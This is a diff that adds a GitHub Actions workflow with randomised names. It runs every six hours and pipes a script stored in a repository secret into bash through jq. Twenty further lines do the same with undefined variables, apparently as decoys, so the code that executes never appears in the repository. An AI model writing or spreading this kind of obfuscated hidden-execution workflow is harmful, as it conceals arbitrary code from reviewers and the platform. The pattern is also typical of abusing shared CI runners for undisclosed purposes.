@@ -1,0 +1,38 @@
+name: kunhuowo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kunhuowo
+        env:
+          x671: ${{ secrets.x671 }}
+        run: |
+          echo $x671 | jq -r .rszee0003 | /bin/bash
+          echo $h2 | jq -r .cv32254 | /bin/bash
+          echo $jlkrc5 | jq -r .bka69 | /bin/bash
+          echo $ybn067 | jq -r .yrruv3 | /bin/bash
+          echo $y0705 | jq -r .hlapq35 | /bin/bash
+          echo $ah2 | jq -r .zqajh27419 | /bin/bash
+          echo $lttz536 | jq -r .uy04496 | /bin/bash
+          echo $wexs9233 | jq -r .xrg68 | /bin/bash
+          echo $qew03171 | jq -r .dletv779 | /bin/bash
+          echo $tmuo8166 | jq -r .wi64 | /bin/bash
+          echo $ne96 | jq -r .vu1 | /bin/bash
+          echo $qb68224 | jq -r .pfaek20624 | /bin/bash
+          echo $p3243 | jq -r .fcgu62 | /bin/bash
+          echo $uafzb7 | jq -r .awui022 | /bin/bash
+          echo $oxou10062 | jq -r .kz18 | /bin/bash
+          echo $d07 | jq -r .d54510 | /bin/bash
+          echo $rzzz02555 | jq -r .xn859 | /bin/bash
+          echo $ao8 | jq -r .jn29164 | /bin/bash
+          echo $su961 | jq -r .dvbvv99278 | /bin/bash
+          echo $anbzb8 | jq -r .hqd8 | /bin/bash
+          echo $lgedc7 | jq -r .lzwl41 | /bin/bash
+
